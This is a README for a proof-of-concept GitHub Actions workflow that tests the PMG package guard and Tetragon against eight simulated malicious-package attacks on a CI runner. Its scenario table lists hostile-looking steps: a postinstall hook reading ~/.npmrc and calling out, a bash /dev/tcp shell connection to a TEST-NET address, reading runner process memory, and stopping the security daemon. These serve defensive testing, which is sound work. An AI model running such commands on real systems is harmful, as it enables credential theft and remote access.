# POC: PMG + Tetragon on a Linux CI runner

This POC runs PMG and [Tetragon](https://tetragon.io) together on a GitHub-hosted Ubuntu runner and
attacks the runner the way a malicious package does. A GitHub-hosted runner is one Linux VM per job, so
the result also holds for a self-hosted runner VM, a build server or a Jenkins, CircleCI or Harness VM
agent.

- To deploy and operate the solution, read [`USER_GUIDE.md`](USER_GUIDE.md).
- The design behind it is the
  [PMG + Tetragon design doc](https://claude.ai/artifact/PC85BukPcfGYYPWvFYUUSF).

## What it runs

The workflow [`poc-pmg-tetragon.yml`](../../.github/workflows/poc-pmg-tetragon.yml) runs three jobs on
`ubuntu-24.04`. Each job runs the same eight scenarios.

| Job | PMG | Tetragon |
| --- | --- | --- |
| `unprotected` | Off | Off |
| `audit` | Kernel enforcement on. Blocks malware and young versions. Reports network profile matches | Audit policies: report only |
| `enforce` | Kernel enforcement on. Blocks malware and young versions. Denies hosts outside the profile | Enforce policies: kill on high-confidence matches |

| Test | Scenario | `unprotected` | `audit` | `enforce` |
| --- | --- | --- | --- | --- |
| T1 | `npm install safedep-test-pkg@0.1.3`, a known malicious package | Installs | PMG blocks | PMG blocks |
| T2 | `pip install safedep-test-pkg==0.0.4`, a known malicious package | Installs | PMG blocks | PMG blocks |
| T3 | `npm install` of a real version published in the last 36 hours | Installs | PMG holds it back | PMG holds it back |
| T4 | Install a local tarball whose `postinstall` reads `~/.npmrc`, calls `https://example.com` and `http://192.0.2.10:8080` | Both calls go out | PMG and Tetragon report | PMG denies the HTTPS call, Tetragon kills the port 8080 call |
| T5 | Open `/proc/<Runner.Worker>/mem` and read 16 bytes | Reads | Tetragon reports | Tetragon kills the reader |
| T6 | `bash -c 'exec 3<>/dev/tcp/192.0.2.10/4444'` | Times out | Tetragon reports | Tetragon kills `bash` |
| T7 | `env -i curl` of the malicious tarball from the registry | Downloads | PMG blocks | PMG blocks |
| T8 | `kill -STOP` then `kill -CONT` on the PMG daemon | Not applicable | Tetragon reports | Tetragon reports |

All targets are harmless. `example.com` is reserved for documentation, and `192.0.2.10` is in
TEST-NET-1, which no network routes. `safedep-test-pkg` is the fixture that SafeDep keeps flagged for
tests.

The report step joins the PMG event log and the Tetragon export. It checks each scenario against the
table above, writes the result into the job summary and fails the job on a mismatch. Each job uploads
its evidence as the artifact `poc-<mode>`.

## Run it

The workflow runs on a push to the POC branch that changes this directory, and on
`workflow_dispatch`. It needs no secrets. SafeDep Cloud is not used.

## Results

See [Results](RESULTS.md).
